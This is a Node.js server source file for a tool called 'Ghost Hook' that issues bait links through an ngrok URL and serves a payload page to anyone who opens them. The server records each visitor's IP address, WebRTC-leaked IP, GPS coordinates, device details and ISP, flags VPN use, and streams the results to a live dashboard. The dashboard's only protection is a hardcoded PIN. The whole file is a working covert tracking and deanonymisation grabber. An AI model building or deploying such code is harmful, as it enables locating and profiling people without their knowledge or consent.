const express  = require('express');
const { v4: uuidv4 } = require('uuid');
const sqlite3  = require('sqlite3').verbose();
const cors     = require('cors');
const http     = require('http');
const { Server } = require('socket.io');

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, { cors: { origin: "*" } });

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ── DATABASE ──────────────────────────────────────────
const db = new sqlite3.Database('./ghost.db');
db.run(`CREATE TABLE IF NOT EXISTS triggers (
  id        TEXT,
  token     TEXT,
  timestamp TEXT,
  http_ip   TEXT,
  webrtc_ip TEXT,
  os        TEXT,
  browser   TEXT,
  gpu       TEXT,
  ram       TEXT,
  cores     TEXT,
  timezone  TEXT,
  language  TEXT,
  screen    TEXT,
  gps_lat   TEXT,
  gps_lng   TEXT,
  vpn_flag  TEXT,
  isp       TEXT,
  city      TEXT,
  country   TEXT,
  useragent TEXT
)`);

// ── GENERATE BAIT TOKEN ───────────────────────────────
app.get('/api/generate', (req, res) => {
  const token = uuidv4();
  res.json({
    token: token,
    url: `https://swashingly-ribbonlike-wilbur.ngrok-free.dev/bait/${token}`
  });
});

// ── SERVE BAIT PAGE ───────────────────────────────────
app.get('/bait/:token', (req, res) => {
  res.sendFile(__dirname + '/public/payload.html');
});

// ── COLLECT DATA ──────────────────────────────────────
app.post('/api/collect/:token', async (req, res) => {
  const data  = req.body;
  const token = req.params.token;
  const id    = uuidv4();
  const timestamp = new Date().toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata'
  });

  const httpIp = req.headers['x-forwarded-for'] ||
                 req.socket.remoteAddress || 'unknown';

  // Get ISP + city from ip-api
  let isp     = 'unknown';
  let city    = 'unknown';
  let country = 'unknown';
  let vpn     = false;

  try {
    const ipToCheck = httpIp.replace('::ffff:', '');
    const r = await fetch(
      `http://ip-api.com/json/${ipToCheck}?fields=isp,city,country,proxy,hosting`
    );
    const j = await r.json();
    isp     = j.isp     || 'unknown';
    city    = j.city    || 'unknown';
    country = j.country || 'unknown';
    vpn     = j.proxy || j.hosting || false;
  } catch(e) {
    console.log('ip-api failed:', e.message);
  }

  const row = [
    id, token, timestamp,
    httpIp,
    data.webrtc_ip || 'collecting...',
    data.os        || 'unknown',
    data.browser   || 'unknown',
    data.gpu       || 'unknown',
    data.ram       || 'unknown',
    data.cores     || 'unknown',
    data.timezone  || 'unknown',
    data.language  || 'unknown',
    data.screen    || 'unknown',
    data.gps_lat   || '',
    data.gps_lng   || '',
    vpn ? 'YES' : 'NO',
    isp, city, country,
    data.useragent || 'unknown'
  ];

  db.run(
    `INSERT INTO triggers VALUES
     (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
    row
  );

  // Emit to dashboard immediately
  io.emit('new_trigger', {
    id, token, timestamp,
    http_ip:   httpIp,
    webrtc_ip: data.webrtc_ip || 'collecting...',
    os:        data.os,
    browser:   data.browser,
    gpu:       data.gpu,
    ram:       data.ram,
    cores:     data.cores,
    timezone:  data.timezone,
    language:  data.language,
    screen:    data.screen,
    gps_lat:   data.gps_lat || '',
    gps_lng:   data.gps_lng || '',
    vpn_flag:  vpn ? 'YES' : 'NO',
    isp, city, country,
    useragent: data.useragent
  });

  res.json({ status: 'captured' });
});

// ── UPDATE WEBRTC IP (fires after main collect) ───────
app.post('/api/update-webrtc/:token', (req, res) => {
  const { webrtc_ip } = req.body;
  const token = req.params.token;

  db.run(
    `UPDATE triggers SET webrtc_ip = ? WHERE token = ?`,
    [webrtc_ip, token],
    function(err) {
      if (err) console.log('WebRTC update error:', err.message);
    }
  );

  // Also emit update to dashboard
  io.emit('webrtc_update', { token, webrtc_ip });

  res.json({ status: 'updated' });
});

// ── PIN VERIFY ────────────────────────────────────────
app.post('/api/verify-pin', (req, res) => {
  const { pin } = req.body;
  res.json({ success: pin === '2580' });
});

// ── GET ALL TRIGGERS ──────────────────────────────────
app.get('/api/triggers', (req, res) => {
  db.all(
    'SELECT * FROM triggers ORDER BY timestamp DESC',
    (err, rows) => res.json(rows || [])
  );
});

// ── START ─────────────────────────────────────────────
server.listen(3000, () => {
  console.log('');
  console.log('  GHOST HOOK — Team CyberGhost');
  console.log('  Server    → http://localhost:3000');
  console.log('  Dashboard → http://localhost:3000/dashboard.html');
  console.log('');
});